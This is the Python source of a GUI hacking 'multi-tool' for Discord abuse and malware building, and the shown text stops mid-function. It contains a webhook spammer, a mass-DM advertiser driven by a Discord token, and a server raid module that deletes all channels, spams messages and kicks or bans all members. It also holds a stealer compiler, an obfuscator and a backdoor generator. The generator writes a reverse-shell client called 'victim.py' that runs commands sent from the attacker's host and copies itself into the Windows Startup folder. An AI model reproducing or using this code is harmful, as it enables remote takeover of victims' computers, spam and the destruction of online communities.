import customtkinter as ctk
import tkinter as tk
from tkinter import Label, messagebox, filedialog
from PIL import Image, ImageTk, ImageSequence
from discord.ext import commands
import discord
import os
import requests
import threading
import py_compile
import webbrowser
import subprocess
import shutil
import pyarmor
import json
import base64
import nmap
import itertools


# --- Classe pour la fenêtre principale ---
class MainApp:
    def __init__(self, master):
        self.master = master
        self.master.title("Crystal Interface")
        self.master.geometry("900x850")

        ctk.set_appearance_mode("system")  
        ctk.set_default_color_theme("blue")  

        self.set_window_icon("favicon.ico")

        self.frame_left = ctk.CTkScrollableFrame(master, width=250, corner_radius=10)
        self.frame_left.grid(row=0, column=0, padx=30, pady=20, sticky="nsw")

        # Right frame (Content)
        self.frame_right = ctk.CTkFrame(master, corner_radius=10)
        self.frame_right.grid(row=0, column=1, padx=30, pady=20, sticky="nsew")

        # Add the Install Requirements button
        self.requirements_button = ctk.CTkButton(self.frame_left, text="Install Requirements", command=self.install_setup_files, fg_color="#FF4D4D", hover_color="#02A9CB", corner_radius=8)
        self.requirements_button.pack(pady=10, padx=15)

        # Theme switcher
        self.theme_switch = ctk.CTkSwitch(self.frame_left, text="Light Mode", command=self.switch_theme, onvalue=1, offvalue=0, progress_color="#7289DA")
        self.theme_switch.pack(pady=20)

        # HOME CRYSTAL INTERFACE
        self.crystal_button = ctk.CTkButton(self.frame_left, text="Crystal Interface", command=self.show_crystal_frame, fg_color="#FF4D4D", hover_color="#FF6666", corner_radius=8)
        self.crystal_button.pack(pady=10, padx=15)

        # Section: Discord Tools
        self.discord_label = ctk.CTkLabel(self.frame_left, text="Discord Tools", font=("Arial", 16, "bold"), text_color="#FFFFFF")
        self.discord_label.pack(pady=(30, 10))

        # Webhook Spammer
        self.webhook_button = ctk.CTkButton(self.frame_left, text="Webhook Spammer", command=self.show_webhook_frame, fg_color="#FF4D4D", hover_color="#FF6666", corner_radius=8)
        self.webhook_button.pack(pady=10, padx=15)

        # Token DMALL
        self.token_button = ctk.CTkButton(self.frame_left, text="Token DMALL", command=self.show_token_frame, fg_color="#FF4D4D", hover_color="#FF6666", corner_radius=8)
        self.token_button.pack(pady=10, padx=15)

        # RAID SERV
        self.raidserv_button = ctk.CTkButton(self.frame_left, text="Raid Serv", command=self.show_raidserv_frame, fg_color="#FF4D4D", hover_color="#FF6666", corner_radius=8)
        self.raidserv_button.pack(pady=10, padx=15)

        # DMALL Friends
        self.dmallfriends_button = ctk.CTkButton(self.frame_left, text="DMALL Friends", command=self.show_dmallfriends_frame, fg_color="#FF4D4D", hover_color="#FF6666", corner_radius=8)
        self.dmallfriends_button.pack(pady=10, padx=15)

        # Section: OSINT Tools
        self.osint_label = ctk.CTkLabel(self.frame_left, text="OSINT Tools", font=("Arial", 16, "bold"), text_color="#FFFFFF")
        self.osint_label.pack(pady=(30, 10))

        # OSINT DB
        self.osint_db_button = ctk.CTkButton(self.frame_left, text="OSINT DB", command=self.show_osint_db_frame, fg_color="#FF4D4D", hover_color="#FF6666", corner_radius=8)
        self.osint_db_button.pack(pady=10, padx=15)

        # Section: Compiler and Obfuscator
        self.utils_label = ctk.CTkLabel(self.frame_left, text="Compiler & Obfuscator", font=("Arial", 16, "bold"), text_color="#FFFFFF")
        self.utils_label.pack(pady=(30, 10))

        # Compiler button
        self.compiler_button = ctk.CTkButton(self.frame_left, text="Compile .exe", command=self.show_compiler_frame, fg_color="#FF4D4D", hover_color="#FF6666", corner_radius=8)
        self.compiler_button.pack(pady=10, padx=15)

        # Backdoor button
        self.backdoor_button = ctk.CTkButton(self.frame_left, text="Backdoor", command=self.show_backdoor_frame, fg_color="#FF4D4D", hover_color="#FF6666", corner_radius=8)
        self.backdoor_button.pack(pady=10, padx=15)

        # Obfuscator button
        self.obfuscator_button = ctk.CTkButton(self.frame_left, text="Obfuscator", command=self.show_obfuscator_frame, fg_color="#FF4D4D", hover_color="#FF6666", corner_radius=8)
        self.obfuscator_button.pack(pady=10, padx=15)

        # Section: Pentest Tools --- 
        self.pentest_label = ctk.CTkLabel(self.frame_left, text="Other Tool", font=("Arial", 16, "bold"), text_color="#FFFFFF")
        self.pentest_label.pack(pady=(30, 10))

        # Gobuster button 
        self.gobuster_button = ctk.CTkButton(self.frame_left, text="Gobuster", command=self.show_gobuster_frame, fg_color="#FF4D4D", hover_color="#FF6666", corner_radius=8)
        self.gobuster_button.pack(pady=10, padx=15)

        # Dnspy button 
        self.dnspy_button = ctk.CTkButton(self.frame_left, text="Decompile .dll & .exe", command=self.show_dnspy_frame, fg_color="#FF4D4D", hover_color="#FF6666", corner_radius=8)
        self.dnspy_button.pack(pady=10, padx=15)

        # --- Sections --- 
        self.crystal_frame = CrystalFrame(self.frame_right)
        self.webhook_frame = WebhookFrame(self.frame_right)
        self.token_frame = TokenFrame(self.frame_right)
        self.compiler_frame = CompilerFrame(self.frame_right)
        self.backdoor_frame = BackdoorFrame(self.frame_right)
        self.obfuscator_frame = ObfuscatorFrame(self.frame_right)
        self.raidserv_frame = RaidservFrame(self.frame_right)
        self.dmallfriends_frame = DmallfriendsFrame(self.frame_right)
        self.osint_db_frame = OSINTDBFrame(self.frame_right)
        self.gobuster_frame = GobusterFrame(self.frame_right)
        self.dnspy_frame = DnspyFrame(self.frame_right)

        self.show_crystal_frame()

    def set_window_icon(self, icon_path):
        if os.path.exists(icon_path):
            self.master.iconbitmap(icon_path)
        else:
            print(f"Icon file not found: {icon_path}")

    def install_setup_files(self):
        webbrowser.open("https://go.dev/dl/go1.23.1.windows-amd64.msi")

    def show_crystal_frame(self):
        self.crystal_frame.pack(fill="both", expand=True)
        self.hide_other_frames([self.webhook_frame, self.token_frame, self.compiler_frame, self.backdoor_frame, self.obfuscator_frame, self.raidserv_frame, self.dmallfriends_frame, self.osint_db_frame, self.gobuster_frame, self.dnspy_frame])

    def show_webhook_frame(self):
        self.webhook_frame.pack(fill="both", expand=True)
        self.hide_other_frames([self.crystal_frame, self.token_frame, self.compiler_frame, self.backdoor_frame, self.obfuscator_frame, self.raidserv_frame, self.dmallfriends_frame, self.osint_db_frame, self.gobuster_frame, self.dnspy_frame])

    def show_token_frame(self):
        self.token_frame.pack(fill="both", expand=True)
        self.hide_other_frames([self.crystal_frame, self.webhook_frame, self.compiler_frame, self.backdoor_frame, self.obfuscator_frame, self.raidserv_frame, self.dmallfriends_frame, self.osint_db_frame, self.gobuster_frame, self.dnspy_frame])

    def show_compiler_frame(self):
        self.compiler_frame.pack(fill="both", expand=True)
        self.hide_other_frames([self.crystal_frame, self.webhook_frame, self.token_frame, self.backdoor_frame, self.obfuscator_frame, self.raidserv_frame, self.dmallfriends_frame, self.osint_db_frame, self.gobuster_frame, self.dnspy_frame])

    def show_backdoor_frame(self):
        self.backdoor_frame.pack(fill="both", expand=True)
        self.hide_other_frames([self.crystal_frame, self.webhook_frame, self.token_frame, self.compiler_frame, self.obfuscator_frame, self.raidserv_frame, self.dmallfriends_frame, self.osint_db_frame, self.gobuster_frame, self.dnspy_frame])

    def show_obfuscator_frame(self):
        self.obfuscator_frame.pack(fill="both", expand=True)
        self.hide_other_frames([self.crystal_frame, self.webhook_frame, self.token_frame, self.compiler_frame, self.backdoor_frame, self.raidserv_frame, self.dmallfriends_frame, self.osint_db_frame, self.gobuster_frame, self.dnspy_frame])

    def show_raidserv_frame(self):
        self.raidserv_frame.pack(fill="both", expand=True)
        self.hide_other_frames([self.crystal_frame, self.webhook_frame, self.token_frame, self.compiler_frame, self.backdoor_frame, self.dmallfriends_frame, self.obfuscator_frame, self.osint_db_frame, self.gobuster_frame, self.dnspy_frame])

    def show_dmallfriends_frame(self):
        self.dmallfriends_frame.pack(fill="both", expand=True)
        self.hide_other_frames([self.crystal_frame, self.webhook_frame, self.token_frame, self.compiler_frame, self.backdoor_frame, self.obfuscator_frame, self.raidserv_frame, self.osint_db_frame, self.gobuster_frame, self.dnspy_frame])

    def show_osint_db_frame(self):
        self.osint_db_frame.pack(fill="both", expand=True) 
        self.hide_other_frames([self.crystal_frame, self.webhook_frame, self.token_frame, self.compiler_frame, self.backdoor_frame, self.obfuscator_frame, self.raidserv_frame, self.dmallfriends_frame, self.gobuster_frame, self.dnspy_frame])

    def show_gobuster_frame(self):
        self.gobuster_frame.pack(fill="both", expand=True)
        self.hide_other_frames([self.crystal_frame, self.webhook_frame, self.token_frame, self.compiler_frame, self.backdoor_frame, self.obfuscator_frame, self.raidserv_frame, self.dmallfriends_frame, self.osint_db_frame, self.dnspy_frame])

    def show_dnspy_frame(self):
        self.dnspy_frame.pack(fill="both", expand=True)
        self.hide_other_frames([self.crystal_frame, self.webhook_frame, self.token_frame, self.compiler_frame, self.backdoor_frame, self.obfuscator_frame, self.raidserv_frame, self.dmallfriends_frame, self.osint_db_frame, self.gobuster_frame])

    def hide_other_frames(self, frames_to_hide):
        for frame in frames_to_hide:
            frame.pack_forget()

    def switch_theme(self):
        if self.theme_switch.get() == 0:
            ctk.set_appearance_mode("dark")
        else:
            ctk.set_appearance_mode("light")


def send_discord_message(webhook_url, message, mention_everyone, result_label):
    if mention_everyone:
        message = f"@everyone {message}"
    
    data = {
        "content": message
    }
    
    try:
        response = requests.post(webhook_url, json=data)
        
        if response.status_code == 204:
            result_label.configure(text="✅ Message sent successfully!", text_color="green")
        else:
            error_message = f"Sending failed (Code {response.status_code}): {response.text}"
            result_label.configure(text=f"❌ {error_message}", text_color="red")
            print(f"Error : {error_message}")
    
    except Exception as e:
        result_label.configure(text=f"❌ Connection error: {e}", text_color="red")
        print(f"Exception: {e}")

def send_messages_in_thread(webhook_url, message, mention_everyone, count, result_label):
    for _ in range(count):
        send_discord_message(webhook_url, message, mention_everyone, result_label)

# --- Classe pour la section HOME CRYSTAL---
class CrystalFrame(ctk.CTkFrame):
    def __init__(self, master):
        super().__init__(master)
        self.configure(bg_color="#23272A")  

        self.gradient_canvas = ctk.CTkCanvas(self, bg="#2C2F33", highlightthickness=0)
        self.gradient_canvas.pack(fill="both", expand=True)

        self.image_canvas = ctk.CTkCanvas(self.gradient_canvas, bg="#2C2F33", highlightthickness=0)
        self.image_canvas.pack(pady=0) 
        self.load_image(r"C:\Users\flipp\Desktop\dev\python\multi-tool\banniere.jpg")

        self.border_frame = ctk.CTkFrame(self.gradient_canvas, bg_color="#2C2F33", border_width=5, border_color="#c00404")
        self.border_frame.pack(padx=10, pady=10, fill="both", expand=True)  

        self.discord_button = ctk.CTkButton(
            self.border_frame,
            text="Join Discord Server",
            command=self.open_discord_server,
            fg_color="#7289DA",
            hover_color="#99A8F7",
            corner_radius=20,
            height=60,
            width=250,
            text_color="#FFFFFF",
            font=("Arial", 14, "bold"),
            border_width=2,
            border_color="#99A8F7",
        )
        self.discord_button.pack(pady=40)

        self.dev_label = ctk.CTkLabel(
            self.border_frame,
            text="Developed by 7sub",
            font=("Arial", 18, "bold"),
            text_color="#FFFFFF"
        )
        self.dev_label.pack(pady=20)

        self.bind("<Configure>", self.on_resize)

    def load_image(self, image_path):
        """Charge et affiche l'image fixe en tant que bannière Discord."""
        self.image = Image.open(image_path)
        self.image = self.image.resize((564,188), Image.LANCZOS)  
        self.image_tk = ImageTk.PhotoImage(self.image)
        self.image_canvas.create_image(0, 0, image=self.image_tk, anchor=tk.NW)

    def update_background_size(self):
        """Redimensionne le fond pour occuper tout l'espace du canvas."""
        width = self.winfo_width() if self.winfo_width() > 0 else 1000
        height = self.winfo_height() if self.winfo_height() > 0 else 1000

        if hasattr(self, 'rect'):
            self.gradient_canvas.delete(self.rect)

        self.rect = self.gradient_canvas.create_rectangle(
            0, 0, width, height, fill="#333333", outline=""
        )

    def on_resize(self, event):
        """Redessine le rectangle lorsque la fenêtre change de taille."""
        self.update_background_size()
        self.load_image(r"C:\Users\flipp\Desktop\dev\python\crystal\banniere.jpg") 

    def open_discord_server(self):
        """Ouvre l'URL du serveur Discord."""
        discord_url = "https://discord.gg/black-gold"
        webbrowser.open(discord_url)



# --- Classe pour la section Webhook Spammer --- 
class WebhookFrame(ctk.CTkFrame):
    def __init__(self, master):
        super().__init__(master)
        self.master = master

        self.webhook_label = ctk.CTkLabel(self, text="Webhook URL:", font=("Arial", 16))
        self.webhook_label.pack(pady=10)

        self.webhook_entry = ctk.CTkEntry(self, width=400, height=40, placeholder_text="Enter Webhook URL")
        self.webhook_entry.pack(pady=10)

        self.message_label = ctk.CTkLabel(self, text="Message to send:", font=("Arial", 16))
        self.message_label.pack(pady=10)

        self.message_entry = ctk.CTkEntry(self, width=400, height=40, placeholder_text="Your message here")
        self.message_entry.pack(pady=10)

        self.everyone_checkbox = ctk.CTkCheckBox(self, text="Mention @everyone")
        self.everyone_checkbox.pack(pady=10)

        self.repetition_label = ctk.CTkLabel(self, text="Number of shipments:", font=("Arial", 16))
        self.repetition_label.pack(pady=10)

        self.repetition_entry = ctk.CTkEntry(self, width=100, height=30, placeholder_text="1")
        self.repetition_entry.pack(pady=10)

        self.send_button = ctk.CTkButton(self, text="Send", command=self.send_message, width=200, fg_color="#B22222", hover_color="#FF6666")
        self.send_button.pack(pady=20)

        self.webhook_info_button = ctk.CTkButton(self, text="Get Webhook Info", command=self.get_webhook_info, width=200, fg_color="#02A9CB", hover_color="#0C758A")
        self.webhook_info_button.pack(pady=10)

        self.result_label = ctk.CTkLabel(self, text="", font=("Arial", 14))
        self.result_label.pack(pady=10)

    def send_message(self):
        webhook_url = self.webhook_entry.get()
        message = self.message_entry.get()
        mention_everyone = self.everyone_checkbox.get()
        repetition = self.repetition_entry.get()

        if not webhook_url:
            self.result_label.configure(text="❌ Webhook URL cannot be empty!", text_color="red")
            return

        if message:
            try:
                repetition_count = int(repetition)
                if repetition_count < 1:
                    raise ValueError
            except ValueError:
                self.result_label.configure(text="❌ Invalid repetition count!", text_color="red")
                return

            send_thread = threading.Thread(target=send_messages_in_thread, args=(webhook_url, message, mention_everyone, repetition_count, self.result_label))
            send_thread.start()
        else:
            self.result_label.configure(text="❌ Message cannot be empty!", text_color="red")

    def get_webhook_info(self):
        webhook_url = self.webhook_entry.get()
        if not webhook_url:
            messagebox.showwarning("Warning", "Please enter a webhook URL.")
            return

        try:
            headers = {'Content-Type': 'application/json'}
            response = requests.get(webhook_url, headers=headers)
            webhook_info = response.json()

            if response.status_code == 200:
                self.display_webhook_info(webhook_info)
                self.copy_to_clipboard(webhook_info)
            else:
                messagebox.showerror("Error", f"Failed to fetch webhook info: {response.status_code} - {response.text}")
        
        except Exception as e:
            messagebox.showerror("Error", f"Failed to fetch webhook info: {e}")

    def display_webhook_info(self, webhook_info):
        webhook_id = webhook_info.get('id', "None")
        webhook_token = webhook_info.get('token', "None")
        webhook_name = webhook_info.get('name', "None")
        webhook_avatar = webhook_info.get('avatar', "None")
        webhook_type = "Bot" if webhook_info.get('type') == 1 else "User Webhook"
        channel_id = webhook_info.get('channel_id', "None")
        guild_id = webhook_info.get('guild_id', "None")

        info_text = f"""
        ID: {webhook_id}
        Token: {webhook_token}
        Name: {webhook_name}
        Avatar: {webhook_avatar}
        Type: {webhook_type}
        Channel ID: {channel_id}
        Server ID: {guild_id}
        """

        messagebox.showinfo("Webhook Info", info_text)

    def copy_to_clipboard(self, webhook_info):
        webhook_id = webhook_info.get('id', "None")
        webhook_token = webhook_info.get('token', "None")
        webhook_name = webhook_info.get('name', "None")
        webhook_avatar = webhook_info.get('avatar', "None")
        webhook_type = "Bot" if webhook_info.get('type') == 1 else "User Webhook"
        channel_id = webhook_info.get('channel_id', "None")
        guild_id = webhook_info.get('guild_id', "None")

        info_text = f"""
        ID: {webhook_id}
        Token: {webhook_token}
        Name: {webhook_name}
        Avatar: {webhook_avatar}
        Type: {webhook_type}
        Channel ID: {channel_id}
        Server ID: {guild_id}
        """

        self.master.clipboard_clear()
        self.master.clipboard_append(info_text)
        messagebox.showinfo("Info", "Webhook info copied to clipboard!")

# --- Classe pour la section Tokens --- 
class TokenFrame(ctk.CTkFrame):
    def __init__(self, master):
        super().__init__(master)
        self.master = master

        self.token_label = ctk.CTkLabel(self, text="Enter Discord token:", font=("Arial", 16))
        self.token_label.pack(pady=10)

        self.token_entry = ctk.CTkEntry(self, width=400, height=40, placeholder_text="Your Discord token here")
        self.token_entry.pack(pady=10)

        self.send_pub_button = ctk.CTkButton(self, text="Send the message", command=self.start_discord_bot, width=200, fg_color="#B22222", hover_color="#FF6666")
        self.send_pub_button.pack(pady=20)

        self.pub_message_label = ctk.CTkLabel(self, text="Message details:", font=("Arial", 16))
        self.pub_message_label.pack(pady=10)

        self.pub_message_entry = ctk.CTkEntry(self, width=400, height=40, placeholder_text="Your message")
        self.pub_message_entry.pack(pady=10)

        self.result_label = ctk.CTkLabel(self, text="", font=("Arial", 14))
        self.result_label.pack(pady=10)

        self.ping_var = ctk.BooleanVar()
        self.ping_checkbox = ctk.CTkCheckBox(self, text="Enable user ping", variable=self.ping_var)
        self.ping_checkbox.pack(pady=10)

        self.result_label = ctk.CTkLabel(self, text="", font=("Arial", 14))
        self.result_label.pack(pady=10)

        self.bot_thread = None

    def start_discord_bot(self):
        token = self.token_entry.get()
        pub_message = self.pub_message_entry.get()

        if not token or not pub_message:
            self.result_label.configure(text="❌ Missing token or message!", text_color="red")
            return

        self.bot_thread = threading.Thread(target=self.run_discord_bot, args=(token, pub_message))
        self.bot_thread.start()

    def run_discord_bot(self, token, pub_message):
        bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

        @bot.event
        async def on_ready():
            self.result_label.configure(text=f"✅ Logged in as {bot.user.name}", text_color="green")

            await self.send_advertisement(bot, pub_message)

        try:
            bot.run(token)
        except Exception as e:
            self.result_label.configure(text=f"❌ Error while connecting: {e}", text_color="red")

    async def send_advertisement(self, bot, message):
        for guild in bot.guilds:
            for member in guild.members:
                if not member.bot:  
                    try:
                        if self.ping_var.get():  
                            await member.send(f'{member.mention} {message}')
                        else:
                            await member.send(message)
                    except discord.Forbidden:
                        pass 

        self.result_label.configure(text="✅ Advertisement sent to all servers!", text_color="green")


# --- Classe pour la section Compilateur --- 
class CompilerFrame(ctk.CTkFrame):
    def __init__(self, master):
        super().__init__(master)
        self.master = master

        self.compiler_label = ctk.CTkLabel(self, text="Select a Python file to compile:", font=("Arial", 16))
        self.compiler_label.pack(pady=10)

        self.select_file_button = ctk.CTkButton(self, text="Choose a file", command=self.select_file, width=200, fg_color="#B22222", hover_color="#FF6666")
        self.select_file_button.pack(pady=20)

        self.result_label = ctk.CTkLabel(self, text="", font=("Arial", 14))
        self.result_label.pack(pady=10)

    def select_file(self):
        file_path = ctk.filedialog.askopenfilename(filetypes=[("Python Files", "*.py")])
        if file_path:
            try:
                # Compile .EXE
                py_compile.compile(file_path, cfile=file_path + "c", dfile=file_path + "d", optimize=2)
                self.result_label.configure(text="✅ Compilation successful!", text_color="green")
            except Exception as e:
                self.result_label.configure(text=f"❌ Compilation error: {e}", text_color="red")

# --- Classe pour la section Stealer --- 
class StealerFrame(ctk.CTkFrame):
    def __init__(self, master):
        super().__init__(master)
        self.master = master

        self.select_file_button = ctk.CTkButton(
            self, 
            text="Compile Stealer Script", 
            command=self.compile_script, 
            width=200, 
            fg_color="#B22222", 
            hover_color="#FF6666"
        )
        self.select_file_button.pack(pady=10)

        
        self.stealer_label = ctk.CTkLabel(
            self, 
            text="📝 place your webhook in stealer.py\n\n",
            font=("Arial", 14),
            wraplength=400,  
            justify="center",  
            corner_radius=10,  
            bg_color="#333333",  
            fg_color="#721c24",  
        )
        self.stealer_label.pack(pady=(10, 20))

        self.result_label = ctk.CTkLabel(
            self, 
            text="", 
            font=("Arial", 14),
            wraplength=400, 
            justify="center"
        )
        self.result_label.pack(pady=(10, 20))

    def compile_script(self):
        file_path = "stealer.py" 
        if os.path.exists(file_path):
            threading.Thread(target=self.compile_file, args=(file_path,)).start()
        else:
            self.update_result_label("❌ File not found!", "red")

    def compile_file(self, file_path):
        try:
            if not shutil.which("pyinstaller"):
                raise EnvironmentError("PyInstaller is not installed or not in the system PATH.")

            
            temp_dir = ".build_temp"    
            output_dir = ".dist_temp"   
            os.makedirs(temp_dir, exist_ok=True)
            os.makedirs(output_dir, exist_ok=True)

            command = [
                "pyinstaller",
                "--onefile",  
                "--distpath", output_dir,  
                "--workpath", temp_dir,   
                "--noconfirm",    
                file_path
            ]
            result = subprocess.run(command, capture_output=True, text=True)

            if result.returncode == 0:
                exe_path = os.path.join(output_dir, os.path.basename(file_path).replace(".py", ".exe"))
                if os.path.exists(exe_path):
                    shutil.move(exe_path, os.getcwd()) 
                    self.update_result_label("✅ Compilation successful!", "green")
                else:
                    self.update_result_label("❌ .exe file not found!", "red")
            else:
                self.update_result_label(f"❌ Compilation failed:\n{result.stderr}", "red")

            spec_file = file_path.replace(".py", ".spec")
            if os.path.exists(spec_file):
                os.remove(spec_file)
            shutil.rmtree(temp_dir)
            shutil.rmtree(output_dir)

        except Exception as e:
            self.update_result_label(f"❌ Error: {e}", "red")
            print(f"Error: {e}")

    def update_result_label(self, text, color):
        self.master.after(0, lambda: self.result_label.configure(text=text, text_color=color))

# --- Classe pour la section Backdoor --- 
class BackdoorFrame(ctk.CTkFrame):
    def __init__(self, master):
        super().__init__(master)
        self.master = master

        self.ip_label = ctk.CTkLabel(self, text="Enter your public IP or Portmap.io URL:", font=("Arial", 16))
        self.ip_label.pack(pady=10)

        self.ip_entry = ctk.CTkEntry(self, width=400, height=40, placeholder_text="Your public IP or Portmap.io URL here")
        self.ip_entry.pack(pady=10)

        self.port_label = ctk.CTkLabel(self, text="Enter the port:", font=("Arial", 16))
        self.port_label.pack(pady=10)

        self.port_entry = ctk.CTkEntry(self, width=400, height=40, placeholder_text="Port number (e.g., 4444)")
        self.port_entry.pack(pady=10)

        self.generate_button = ctk.CTkButton(self, text="Generate Client Script", command=self.generate_script, width=300, fg_color="#B22222", hover_color="#FF6666")
        self.generate_button.pack(pady=20)

        self.result_label = ctk.CTkLabel(self, text="", font=("Arial", 14))
        self.result_label.pack(pady=10)

    def generate_script(self):
        ip_or_url = self.ip_entry.get()
        port = self.port_entry.get()
        
        if not ip_or_url:
            self.result_label.configure(text="❌ IP or URL cannot be empty!", text_color="red")
            return
        if not port.isdigit():
            self.result_label.configure(text="❌ Port must be a number!", text_color="red")
            return
        
        port = int(port)
        
        client_code = f"""
import socket
import subprocess
import os
import time
import threading

TARGET = "{ip_or_url}"
PORT = {port}

def connect_to_server():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET, PORT))

            while True:
                command = s.recv(1024).decode("utf-8")
                if command.lower() == "exit":
                    break
                elif command:
                    output = subprocess.getoutput(command)
                    s.send(output.encode("utf-8"))
            s.close()
        except:
            time.sleep(10)

def run_persistent():
    startup_path = os.getenv('APPDATA') + '\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\victim.exe'
    if not os.path.exists(startup_path):
        os.rename(__file__, startup_path)

threading.Thread(target=connect_to_server).start()
run_persistent()
"""

        with open("victim.py", "w") as client_file:
            client_file.write(client_code)

        self.result_label.configure(text="✅ Script generated successfully!", text_color="green")


# --- Classe pour la section Obfuscator --- 
class ObfuscatorFrame(ctk.CTkFrame):
    def __init__(self, master):
        super().__init__(master)
        self.master = master

        self.obfuscator_label = ctk.CTkLabel(self, text="Select a Python file to obfuscate:", font=("Arial", 16))
        self.obfuscator_label.pack(pady=10)

        self.select_file_button = ctk.CTkButton(self, text="Choose a file", command=self.select_file, width=200, fg_color="#B22222", hover_color="#FF6666")
        self.select_file_button.pack(pady=20)

        self.result_label = ctk.CTkLabel(self, text="", font=("Arial", 14))
        self.result_label.pack(pady=10)

    def select_file(self):
        file_path = filedialog.askopenfilename(filetypes=[("Python files", "*.py")])
        if file_path:
            self.result_label.configure(text=f"Obfuscating: {file_path}")
            self.obfuscate_python_file(file_path)

    def obfuscate_python_file(self, file_path):
        obfuscated_file = file_path.replace(".py", "_obfuscated.py")
        try:
            subprocess.run(["pyarmor-7", "obfuscate", obfuscated_file, file_path], check=True)
            self.result_label.configure(text=f"✅ Obfuscation complete! Obfuscated file saved as: {obfuscated_file}")
        except subprocess.CalledProcessError as e:
            self.result_label.configure(text=f"❌ Obfuscation failed: {e}")


# --- Classe pour la section Raid Serv ---
class RaidservFrame(ctk.CTkFrame):
    def __init__(self, master):
        super().__init__(master)
        self.master = master
        self.configure(fg_color="#2C2F33") 

        self.title_label = ctk.CTkLabel(self, text="🔧 Discord Bot RAID", font=("Arial", 24), text_color="#FFFFFF")
        self.title_label.pack(pady=20)

        self.token_label = ctk.CTkLabel(self, text="Enter Discord Bot Token:", font=("Arial", 16), text_color="#FFFFFF")
        self.token_label.pack(pady=(10, 0))

        self.token_entry = ctk.CTkEntry(self, width=400, height=40, placeholder_text="Your Discord bot token here")
        self.token_entry.pack(pady=(0, 10))

        self.server_ids_label = ctk.CTkLabel(self, text="Enter Server ID exemple (11946, 14872):", font=("Arial", 16), text_color="#FFFFFF")
        self.server_ids_label.pack(pady=(10, 0))

        self.server_ids_entry = ctk.CTkEntry(self, width=400, height=40, placeholder_text="Server ID here")
        self.server_ids_entry.pack(pady=(0, 10))

        separator = tk.Frame(self, height=2, bg="#FFFFFF")
        separator.pack(fill='x', pady=15)

        self.button_frame = ctk.CTkFrame(self, fg_color="#2C2F33")
        self.button_frame.pack(pady=(10, 20))

        self.create_button("Token Info", self.token_info)
        self.create_button("Delete All Channels", self.delete_channels)
        self.create_button("Create Channels", self.create_channels)
        self.create_button("Spam Messages in All Channels", self.spam_messages)
        self.create_button("Kick All Members", self.kick_all_members)
        self.create_button("Ban All Members", self.ban_all_members)

        separator2 = tk.Frame(self, height=2, bg="#FFFFFF")
        separator2.pack(fill='x', pady=15)

        self.channel_count_entry = self.create_entry_with_label("Number of channels to create:", "Enter number")
        self.message_entry = self.create_entry_with_label("Message to spam:", "Your message")
        self.spam_message_count_entry = self.create_entry_with_label("Number of messages to send:", "Enter number")

        self.result_label = ctk.CTkLabel(self, text="", font=("Arial", 14), text_color="#FFFFFF")
        self.result_label.pack(pady=10)

        self.bot_thread = None

    def create_button(self, text, command):
        button = ctk.CTkButton(self.button_frame, text=text, command=command, width=150, fg_color="#4682B4", hover_color="#87CEEB")
        button.pack(side=tk.LEFT, padx=5) 


    def create_entry_with_label(self, label_text, placeholder_text):
        label = ctk.CTkLabel(self, text=label_text, font=("Arial", 16), text_color="#FFFFFF")
        label.pack(pady=(10, 0))
        
        entry = ctk.CTkEntry(self, width=100, height=30, placeholder_text=placeholder_text)
        entry.pack(pady=(0, 10))
        
        return entry

    def start_discord_bot(self, target_func):
        token = self.token_entry.get()
        server_ids = self.server_ids_entry.get().split(',')

        if not token:
            self.result_label.configure(text="❌ Missing token!", text_color="red")
            return

        server_ids = [id.strip() for id in server_ids if id.strip()]

        if not server_ids:
            server_ids = None 

        self.bot_thread = threading.Thread(target=target_func, args=(token, server_ids))
        self.bot_thread.start()

    def token_info(self):
        self.start_discord_bot(self.run_token_info)

    def delete_channels(self):
        self.start_discord_bot(self.run_delete_channels)

    def create_channels(self):
        self.start_discord_bot(self.run_create_channels)

    def spam_messages(self):
        self.start_discord_bot(self.run_spam_messages)

    def kick_all_members(self):
        self.start_discord_bot(self.run_kick_all_members)

    def ban_all_members(self):
        self.start_discord_bot(self.run_ban_all_members)

    def run_token_info(self, token, server_ids):
        bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

        @bot.event
        async def on_ready():
            info_text = f"✅ Logged in as {bot.user.name}\n"
            info_text += "Servers connected to:\n"

            server_info_list = []

            for guild in bot.guilds:
                if server_ids is None or str(guild.id) in server_ids:
                    server_info = f"Server: {guild.name} (ID: {guild.id}), Members: {guild.member_count}\n"
                    server_info_list.append(server_info)
                    info_text += server_info

            with open("server_info.txt", "w", encoding="utf-8") as file:
                file.write(info_text)

            self.result_label.configure(text=f"✅ Server information saved in 'server_info.txt'", text_color="#ffffff")

            await bot.close()

        try:
            bot.run(token)
        except Exception as e:
            self.result_label.configure(text=f"❌ Error: {e}", text_color="red")

    def run_delete_channels(self, token, server_ids):
        bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

        @bot.event
        async def on_ready():
            self.result_label.configure(text=f"✅ Logged in as {bot.user.name}", text_color="green")

            for guild in bot.guilds:
                if server_ids is None or str(guild.id) in server_ids:
                    for channel in guild.channels:
                        try:
                            await channel.delete()
                            print(f"Deleted channel: {channel.name}")
                        except discord.Forbidden:
                            print(f"Permission denied for deleting {channel.name}")
                            continue

            await bot.close()

        try:
            bot.run(token)
        except Exception as e:
            self.result_label.configure(text=f"❌ Error: {e}", text_color="red")

    def run_create_channels(self, token, server_ids):
        bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

        @bot.event
        async def on_ready():
            self.result_label.configure(text=f"✅ Logged in as {bot.user.name}", text_color="green")

            try:
                channel_count = int(self.channel_count_entry.get())
                if channel_count <= 0:
                    raise ValueError("Invalid number of channels")

                for guild in bot.guilds:
                    if server_ids is None or str(guild.id) in server_ids:
                        for i in range(channel_count):
                            await guild.create_text_channel(f"raid by 7sub")
                            print(f"Created channel: raid by 7sub")

            except ValueError as e:
                self.result_label.configure(text=f"❌ {e}", text_color="red")

            await bot.close()

        try:
            bot.run(token)
        except Exception as e:
            self.result_label.configure(text=f"❌ Error: {e}", text_color="red")

    def run_spam_messages(self, token, server_ids):
        bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

        @bot.event
        async def on_ready():
            self.result_label.configure(text=f"✅ Logged in as {bot.user.name}", text_color="green")
            spam_message = self.message_entry.get()

            if not spam_message:
                self.result_label.configure(text="❌ Message cannot be empty!", text_color="red")
                return

            try:
                spam_count = int(self.spam_message_count_entry.get())
                if spam_count <= 0:
                    raise ValueError("Invalid number of messages")

                for guild in bot.guilds:
